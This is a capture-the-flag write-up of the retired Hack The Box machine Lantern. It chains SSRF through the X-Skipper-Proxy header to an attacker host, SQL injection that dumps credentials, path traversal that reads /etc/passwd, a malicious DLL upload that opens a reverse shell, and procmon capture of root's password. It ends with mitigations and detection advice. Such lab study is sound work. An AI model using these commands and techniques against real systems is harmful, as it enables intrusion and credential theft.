---
machine: Lantern
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, ssrf, blazor, sqli, dotnet, privesc]
---

# Lantern — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Skipper Proxy on `80` is vulnerable to CVE-2022-38580: the `X-Skipper-Proxy` header makes the proxy request an arbitrary URL. This reaches an internal service on `5000`, a Blazor HR application with SQLite virtualised in the browser. The vacation search is injectable and dumps the `Employees` table, including `admin`'s password in `InternalInfo`. The `3000` panel loads `.dll` modules from `/opt/components`; the main site has a file read in `/PrivacyAndPolicy` and the upload module writes files with traversal. A malicious Razor Class Library is uploaded to execute code as `tomas`. `tomas` can run `procmon` as root; attaching it to a root `nano` editing `/root/backup.sh` recovers root's password from `write` events.

## Recon

```bash
nmap -Pn -sCV -p22,80,3000 <IP>
```

- `22` OpenSSH 8.9p1.
- `80` Skipper Proxy, redirecting to `lantern.htb`.
- `3000` Kestrel serving a Blazor login application.

```bash
echo '<IP> lantern.htb' | sudo tee -a /etc/hosts
```

The public site is an IT company with `/vacancies` and `/submit` for resumes. The `3000` panel is Blazor Server and uses WebSockets or polling.

## Enumeration

Confirm Skipper and test the header:

```bash
curl -s http://lantern.htb/ -H 'X-Skipper-Proxy: http://<ATTACKER>:8000'
```

The request arrives from Lantern with the original path. Fuzzing internal ports with the same header finds `5000` and `8000`; `5000` serves another Blazor application, `InternaLantern`.

Use a header-editing proxy to browse the internal app. The vacation form searches by ID and reflects SQL errors. A quote breaks the query and `-- -` comments it out; a three-column `UNION SELECT` extracts `sqlite_version()` and the schema. The `Employees` table has `InternalInfo` with `admin` credentials.

## Foothold

The `admin` credentials work at `http://lantern.htb:3000`. The panel loads modules from `/opt/components`; the `Files` module shows the public site's source. In `app.py`, `/PrivacyAndPolicy` concatenates `lang` and `ext` into a path:

```bash
curl 'http://lantern.htb/PrivacyAndPolicy?lang=.&ext=/../../../etc/passwd'
```

That file read downloads `FileUpload.dll`. The module combines `/var/www/sites/lantern.htb/static/images` with the filename and only strips `\`, so a name containing `../` writes outside the directory. Upload a .NET 6 Razor Class Library with a `Component.razor` whose `OnInitialized()` launches a reverse shell, then load it from the panel. The shell runs as `tomas`.

## Lateral movement

There is no pivot: `tomas` is the only user with a shell. Their home contains the `LanternAdmin` project and an SSH key.

## Privilege escalation

`tomas` can run `/usr/bin/procmon` as root without a password. A root `nano /root/automation.sh` and an `expect` running `/root/bot.exp` are active. Attach `procmon` to `nano`:

```bash
sudo procmon -p $(pidof nano)
```

Filter `write` calls, export the SQLite database with F6 and extract the buffers. The events include the line the bot writes:

```text
echo <PASSWORD> | sudo ./backup.sh
```

That password works for `root`:

```bash
su -
id
```

## Evidence

- `X-Skipper-Proxy` header with a response from the attacker host.
- Ports `5000`/`8000` reachable through SSRF.
- SQL errors and a dump of `Employees`/`InternalInfo`.
- Login on `3000` as `admin`.
- `/PrivacyAndPolicy` reading `/etc/passwd` and `FileUpload.dll`.
- Malicious Razor DLL loaded and a shell as `tomas`.
- `procmon` database with root's password and a successful `su -`.

## Lessons learned

- A proxy header can turn a reverse proxy into full SSRF.
- Blazor may run SQLite in the client, but logic and secrets remain on the server.
- A module that concatenates paths and strips only one separator allows traversal.
- `procmon` on a root process reveals credentials written to terminals and scripts.
- Source code disclosure speeds up finding routes and modules.

## Mitigations and detection

- Update Skipper and never trust a client-supplied `X-Skipper-Proxy`.
- Parameterise SQL and do not return database errors to the browser.
- Resolve paths with `realpath` and restrict DLL loading to a signed directory.
- Do not execute user-uploaded modules; validate name, type and path.
- Restrict `procmon` and never type passwords into root scripts or terminals.
- Detect anomalous proxy headers, `UNION SELECT`, traversal in `lang`/`ext` and new DLLs in `/opt/components`.

## References

- [0xdf — Lantern](https://0xdf.gitlab.io/2024/11/30/htb-lantern.html)
- [IppSec — Lantern](https://www.youtube.com/watch?v=nuwlmlEp4qY)
- [NVD — CVE-2022-38580](https://nvd.nist.gov/vuln/detail/CVE-2022-38580)
- [Hack The Box — Lantern](https://app.hackthebox.com/machines/lantern)
